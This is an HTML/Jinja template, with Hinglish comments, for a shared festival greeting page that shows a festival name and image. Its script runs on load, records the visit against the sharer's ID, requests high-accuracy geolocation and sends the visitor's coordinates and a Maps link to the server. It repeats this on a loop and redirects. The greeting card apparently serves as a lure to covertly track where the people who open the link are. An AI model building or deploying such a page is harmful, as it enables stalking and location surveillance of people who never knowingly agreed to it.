<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{{festival.festival_name}}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            background: linear-gradient(135deg, #f8f6f1, #edf0f4);
            font-family: Arial, Helvetica, sans-serif;
        }

        .festival-card {
            width: 100%;
            max-width: 860px;
            padding: 30px;
            background: #fffdf9;
            border: 1px solid #e9e2d8;
            border-radius: 22px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.07);
            text-align: center;
        }

        .festival-name {
            margin-bottom: 28px;
            color: #493124;
            font-family: Georgia, "Times New Roman", serif;
            font-size: clamp(28px, 5vw, 54px);
            font-weight: bold;
            line-height: 1.2;
            overflow-wrap: anywhere;
        }

        .festival-name::before,
        .festival-name::after {
            content: "✿";
            display: inline-block;
            margin: 0 18px;
            color: #e99a20;
            font-size: 0.55em;
            vertical-align: middle;
        }

        .festival-image {
            display: block;
            width: 100%;
            max-height: 600px;
            aspect-ratio: 16 / 10;
            object-fit: contain;
            background: #f5f0e8;
            border-radius: 14px;
        }

        @media (max-width: 600px) {
            body {
                padding: 14px;
            }

            .festival-card {
                padding: 18px;
                border-radius: 16px;
            }

            .festival-name {
                margin-bottom: 20px;
            }

            .festival-name::before,
            .festival-name::after {
                margin: 0 8px;
            }

            .festival-image {
                aspect-ratio: 4 / 5;
                max-height: 70vh;
                border-radius: 10px;
            }
        }
    </style>
</head>

<body>


    <main class="festival-card">

        <h1 class="festival-name">
            {{ festival["festival_name"] }}
        </h1>

        <img class="festival-image" src="{{ url_for('static', filename=festival['image_path']) }}"
            alt="{{ festival['festival_name'] }}">

    </main>
    <script>
        // Flask template se share link ka shared_id milega
        const sharedId = {{ shared_id | tojson }};
        const u_id = {{ ui_id | tojson}};
        const festival_ = {{ festival | tojson}};

        console.log("shared_id: " + sharedId + " u_id: " + u_id + " festival: " + festival_);


        let visitorId = localStorage.getItem("visitor_id");
        let locationInterval = null;
        console.log(visitorId);


        // 1. Pehle visit record karo
        async function trackVisit() {
            try {
                const response = await fetch("/track", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        page_path: window.location.pathname,
                        shared_id: sharedId,
                        visitor_id: visitorId ? Number(visitorId) : 0
                    })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.message || data.error || "Tracking failed");
                }

                if (!data.visitor_id) {
                    throw new Error("Visitor ID response mein nahi mila");
                }

                // Isi visit ki ID use hogi; purani ID par depend nahi karenge
                visitorId = data.visitor_id;
                localStorage.setItem("visitor_id", String(visitorId));
                localStorage.setItem("shared_id", String(sharedId));
                localStorage.setItem("festival_id", String(u_id));

                console.log("Visit successfully recorded:", visitorId);

                // Pehli location turant save karne ki koshish karo
                getLocation();

                // Purana interval ho to clear karo
                if (locationInterval !== null) {
                    clearInterval(locationInterval);
                }

                // Har 60 seconds mein location update
                locationInterval = setInterval(() => {
                    getLocation();
                    window.location.href = "/";
                }, 1000);

            } catch (error) {
                console.error("Visit record nahi ho saka:", error);
            }
        }

        // 2. Visitor ki location lo aur server par save karo
        function getLocation() {
            if (!visitorId || !sharedId) {
                console.log("Visitor ID ya Shared ID available nahi hai.");
                return;
            }

            if (!navigator.geolocation) {
                console.log("Is browser mein Geolocation supported nahi hai.");
                return;
            }

            console.log("Location permission / location ka wait ho raha hai...");

            navigator.geolocation.getCurrentPosition(
                async function (position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    const mapLink =
                        `https://www.google.com/maps?q=${latitude},${longitude}`;

                    try {
                        const response = await fetch("/save-location", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                id: visitorId,
                                shared_id: sharedId,
                                latitude: latitude,
                                longitude: longitude,
                                accuracy: accuracy,
                                mapLink: mapLink
                            })
                        });

                        const result = await response.json();

                        if (!response.ok) {
                            throw new Error(
                                result.message || result.error ||
                                "Location save nahi hui"
                            );
                        }

                        console.log("Location successfully saved:", result);
                        window.location.href = "/";

                    } catch (error) {
                        console.error("Failed to save location:", error);
                    }
                },

                function (error) {
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            console.log("Location permission deny kar di gayi.");
                            break;

                        case error.POSITION_UNAVAILABLE:
                            console.log("Device ki location available nahi hai.");
                            break;

                        case error.TIMEOUT:
                            console.log("Location request timeout ho gayi.");
                            break;

                        default:
                            console.log("Location obtain nahi ho saki.");
                    }
                },

                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        window.addEventListener('load', trackVisit);
        // Page load par visit record karo
        trackVisit();

    </script>

</body>

</html>
